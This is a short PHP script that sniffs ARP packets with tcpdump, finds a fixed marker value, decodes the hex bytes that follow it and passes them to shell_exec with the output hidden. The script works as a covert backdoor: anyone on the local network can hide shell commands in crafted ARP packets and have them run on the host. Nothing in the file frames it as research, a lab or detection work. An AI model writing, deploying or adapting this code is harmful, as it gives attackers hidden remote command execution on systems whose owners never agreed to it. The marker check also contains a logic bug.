<?php

$FLAG = "709505";
$FLAGLEN = 6;

// Command to sniff ARP packets
// $command = "tcpdump -i em1 arp -vvv -xx -c 1 2>&1"; // Captures 10 ARP packets
$command = "tcpdump -i em1 arp -xx -n -c 1 2>/dev/null | awk -F: '/0x[0-9]{4}/{print $2}'";


function get_ARP(){
    global $command;
    global $FLAG;
    global $FLAGLEN;
    // Execute the command
    ob_start();
    exec($command, $output, $return_var);
    ob_end_clean();

    if ($return_var !== 0) {
        echo "Error capturing packets. Command output:\n";
        echo implode("\n", $output);
    } else {
        echo "Captured ARP Packets:\n";
        echo implode("\n", $output);
        // Clean
        $output = implode("", $output);
        $output = str_replace(["\r", "\n", " "], '', $output);

        echo "\n\n";
        print_r($output);
        echo "\n\n";

        $index = strpos($output, $FLAG, 0) + $FLAGLEN;
        if (!$index){
            return get_ARP();
        }
        $stop_index = strpos($output, "00", $index + 6);
        $payload_len = $stop_index - $index;

        $payload = substr($output, $index, $payload_len);
        
        echo "\n\nHex Payload:\n";
        print_r($payload);

        $command = pack("H*", $payload);

        echo "\nPayload:\n";
        print_r($command);

        ob_start();
        shell_exec($command);
        ob_end_clean();
    }
}
?>
